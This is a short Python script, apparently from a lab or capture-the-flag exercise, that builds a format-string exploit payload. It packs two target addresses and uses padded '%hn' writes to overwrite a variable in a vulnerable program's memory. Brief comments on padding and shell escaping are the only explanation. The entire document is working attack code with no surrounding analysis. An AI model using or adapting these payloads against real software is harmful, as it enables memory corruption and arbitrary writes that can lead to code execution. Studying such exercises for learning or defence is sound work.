import struct;
# address of high-order half-word of the target variable
thi = struct.pack('I', 0x8049812)
# address of low-order half-word of the target variable
tlow = struct.pack('I', 0x8049810)
# The padding count always takes into account the amount of bytes
# written beforehand. Don't forget to escape $ signs if typed on the cmd line.
print thi + tlow + '%250x' + '%12$hn' + '%21570x' + '%13$hn'
